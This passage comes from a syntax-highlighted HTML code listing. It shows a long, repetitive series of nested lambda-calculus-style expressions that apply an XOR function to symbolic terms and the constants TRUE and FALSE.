class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span 